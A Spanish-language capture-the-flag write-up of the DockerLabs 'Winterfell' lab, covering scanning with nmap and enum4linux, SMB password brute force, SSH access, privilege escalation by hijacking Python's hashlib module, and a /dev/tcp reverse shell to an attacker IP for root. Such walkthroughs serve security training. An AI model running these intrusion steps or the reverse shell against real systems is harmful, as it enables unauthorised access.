## Maquina Vulnerable "Winterfell" de DockerLabs


Para realizar esta máquina vulnerable, se utilizó la plataforma de DockerLabs, la cual ofrece una variedad de laboratorios prácticos para aprender sobre seguridad en contenedores y Docker. La máquina "Winterfell" es una de las opciones disponibles en esta plataforma.

## Fase de Reconocimiento:

Primero para realizar una tarea de Pentesting, se debe realizar un reconocimiento a los activos disponibles que existen en la red. Para esto, simplemente verificamos que la máquina se encuentra encendida y que servicios tiene corriendo, simplemente haciendo un Ping:

```bash
ping 172.17.0.2 -c 3
```
![image](/static/images/winterfell/ping_winterfell.png)

## Escaneo de Puertos:

Luego de verificar que la máquina se encuentra encendida, se procede a realizar un escaneo de puertos para identificar los servicios que están corriendo en la máquina. Para esto, se utiliza la herramienta Nmap:

```bash
nmap -p- --open  172.17.0.2 -vvv -oG allPorts
```
Guardamos el resultado en formato grepeable para poder utilizar la herramienta que copia solo los puertos abiertos para luego realizar un escaneo más profundo.

![image](/static/images/winterfell/puertosabiertos.png)

Ahora escaneamos mas profundo solo los puertos abiertos de la máquina:

```bash
nmap -p22,80,139,445 -sCVT -Pn 172.17.0.2 -vvv -oN Targeted 
```
![image](/static/images/winterfell/nmap.png)

Para poder obtener mas información se utiliza la herramienta enum4linux, la cual nos permite obtener información de los usuarios, grupos, políticas de contraseñas, recursos compartidos, etc.

```bash
enum4linux -a 172.17.0.2
```
![image](/static/images/winterfell/enum4linux.png)

Como se puede observar, obtuvimos distintos usuarios, con los cuales se puede aplicar fuerza bruta para intentar obtener las contraseñas. Al no poder encontrar con fuerza bruta, se procede a buscar en la web haciendo fuzzing con la herramienta dirb, para intentar encontrar algún archivo o directorio interesante.

```bash
dirb http://172.17.0.2
```
Se encuentra un directorio llamado "dragon", donde se pueden observar datos interesantes que podrían ser contraseñas.

![image](/static/images/winterfell/contraseñas.png)

También se encuentra un recurso compartido "shared", el cual se puede intentar acceder para ver si se encuentra información sensible. Al tener los usuarios reconocidos para poder realizar fuerza bruta, se utiliza la herramienta hydra para intentar obtener las contraseñas de los usuarios obtenidos anteriormente.

```bash
smbclient -L 172.17.0.2 -N 
```
![image](/static/images/winterfell/shared.png)


## Explotación de Vulnerabilidades:

Ahora intentamos acceder a smb con el usuario "jon" y con las posibles contraseñas guardadas como payload. (los guarde como users.txt por que pensé que podían ser usuarios, pero en realidad son contraseñas).

```bash
netexec smb 172.17.0.2 -U jon -P ./users.txt
```
![image](/static/images/winterfell/smb.png)

Una vez dentro del recurso compartido con el comando:

```bash
smbclient //172.17.0.2/shared -U jon
```

En contramos un archivo llamado "proteccion del reino", el cual descargamos y vemos que tiene dentro.

![image](/static/images/winterfell/quetiene.png)

![image](/static/images/winterfell/dentro.png)

Como se puede ver, se tiene un mensaje cifrado, el cual claramente es base64. Procedemos a ver que dice:

![image](/static/images/winterfell/hijolanister.png)

Ahora usamos esta contraseña para entrar por ssh con el usuario "jon".

```bash
ssh jon@172.17.0.2
```
## Escalado de Privilegios:

Vemos que existe un mensaje oculto para Jon, el cual vemos y dice lo siguiente:

![image](/static/images/winterfell/mensajejon.png)

Vemos que al usar el comando "sudo -l" nos dice que podemos ejecutar un script de python para encriptar un mensaje cualquiera como jon o aria. En este script, se utiliza la libreria hashlib, en donde uno puede crear un archivo con ese nombre y poner un código malicioso para obtener una shell como aria. 

```python
import os
os.system("/bin/bash")
```
Luego se ejecuta el script

```bash
sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
```
Y obtenemos la shell como aria, en donde podemos ver la bandera de usuario.

![image](/static/images/winterfell/shellaria.png)

Ahora hacemos un "sudo -l" y podemos usar los siguientes comandos como daenerys:

![image](/static/images/winterfell/comandosdaenerys.png)


Buscando con los comandos que podemos usar, vemos que daenerys tiene un mensaje para que aria lo pueda leer. 

![image](/static/images/winterfell/mensajedaenerys.png)

Una vez dentro del directorio de daenerys, usamos el comando "sudo -l" y vemos que se puede ejecutar una shell como root.

![image](/static/images/winterfell/shell.png)

Se edita el archivo .shell.sh con la ip de la maquina atacante y con el puerto 9991 nos ponemos en escucha. De esta forma podemos obtener una reverse shell como root.

El codigo que se utiliza es:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.100.119/9991 0>&1
```
De esta forma obtenemos acceso a la máquina victima como root.

![image](/static/images/winterfell/ROOT.png)